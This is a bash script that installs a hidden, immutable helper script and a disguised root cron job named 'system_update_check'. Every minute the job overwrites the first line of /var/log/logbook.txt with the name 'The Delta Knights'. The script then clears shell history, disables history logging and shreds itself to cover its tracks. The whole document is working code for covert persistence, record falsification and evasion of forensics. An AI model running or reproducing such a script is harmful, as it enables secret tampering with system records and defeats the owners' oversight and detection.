#!/bin/bash

# Configuration
PARTY="The Delta Knights"
HIDDEN_SCRIPT="/var/tmp/.update_hidden"  # Hidden script location
LOGBOOK_PATH="/var/log/logbook.txt"      # Default logbook location

# Create the hidden update script
cat > "$HIDDEN_SCRIPT" << EOL
#!/bin/bash

# Suppress all output
exec 1>/dev/null 2>&1

PARTY="$PARTY"
LOGBOOK="$LOGBOOK_PATH"

if [ -f "\$LOGBOOK" ]; then
    # Read file content
    content=\$(cat "\$LOGBOOK")
    # Update first line while preserving the rest
    echo "\$PARTY" > "\$LOGBOOK"
    echo "\$content" | tail -n +2 >> "\$LOGBOOK"
fi
EOL

# Make script hidden and executable
chmod 700 "$HIDDEN_SCRIPT"
chattr +i "$HIDDEN_SCRIPT" 2>/dev/null  # Make file immutable if possible

# Create cron job under a generic name
CRON_ENTRY="* * * * * $HIDDEN_SCRIPT #system_update_check"

# Add to root's crontab silently
(crontab -l 2>/dev/null | grep -v "$HIDDEN_SCRIPT"; echo "$CRON_ENTRY") | crontab - 2>/dev/null

# Clean up our tracks
history -c
unset HISTFILE

# Remove the setup script itself
shred -u "$0" 2>/dev/null

exit 0
